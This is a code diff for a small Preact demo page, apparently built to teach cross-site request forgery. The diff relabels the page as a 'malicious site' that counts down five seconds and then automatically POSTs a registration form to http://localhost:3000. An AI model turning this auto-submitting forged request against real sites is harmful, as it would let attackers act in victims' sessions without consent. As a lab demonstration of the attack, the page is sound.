@@ -11,6 +11,7 @@
     <div id='app'></div>
 
     <!-- load libraries -->
+    <script src='//unpkg.com/lodash@latest'></script>
     <script src='//unpkg.com/preact@latest'></script>
     <script src='//unpkg.com/preact@latest/hooks/dist/hooks.umd.js'></script>
     <script src='//unpkg.com/htm'></script>
@@ -18,7 +19,7 @@
     <!-- do render -->
     <script>
       const { h, render } = window.preact
-      const { useState } = window.preactHooks
+      const { useState, useEffect } = window.preactHooks
       const fetch = window.fetch
 
       // SEE: https://github.com/axios/axios/blob/6284abfa0693c983e9378b2d074c095262aac7bd/lib/helpers/cookies.js
@@ -33,6 +34,17 @@
       const App = (props) => {
         const [page, setPage] = useState(props.page)
         const [result, setResult] = useState('')
+        const [timer, setTimer] = useState(5)
+
+        const countDown = () => setTimer((previous) => previous - 1)
+
+        useEffect(() => {
+          if (timer > 0) {
+            setTimeout(countDown, 1000)
+            return
+          }
+          onSubmit()
+        }, [timer])
 
         const go = (pathname) => {
           window.history.pushState({}, null, pathname)
@@ -45,7 +57,7 @@
           }
 
           // Ensure CSRF-TOKEN fetched.
-          await fetch('/api/ensure_csrf_token').then((res) => res.text())
+          await fetch('http://localhost:3000/api/ensure_csrf_token').then((res) => res.text())
 
           // SEE: https://stackoverflow.com/a/46642899
           const form = new window.URLSearchParams();
@@ -53,7 +65,7 @@
           form.append('password', '')
 
           // SEE: https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
-          const response = await fetch('/register', {
+          const response = await fetch('http://localhost:3000/register', {
             cache: 'no-cache',
             method: 'POST',
             headers: {
@@ -69,13 +81,19 @@
           go('/register')
         }
 
+        let message = `after ${timer} seconds${_.times(timer, () => '.').join('')}`
+        if (timer === 1) {
+          message = 'after 1 second.'
+        } else if (timer <= 0) {
+          message = 'submitted!'
+        }
+
         if (page === '/form') {
           return html`
-            <h1>SPA Example</h1>
+            <h1>SPA Example of malicious site 😼</h1>
 
-            <header style='margin: 1rem 0;'>
-              <a href='/'>SSR version</a>
-            </header>
+            <h3>This page will submit form against "http://localhost:3000" automatically.</h3>
+            <p style="font-weight: bold;">${message}</p>
 
             <form
                 action='/register'
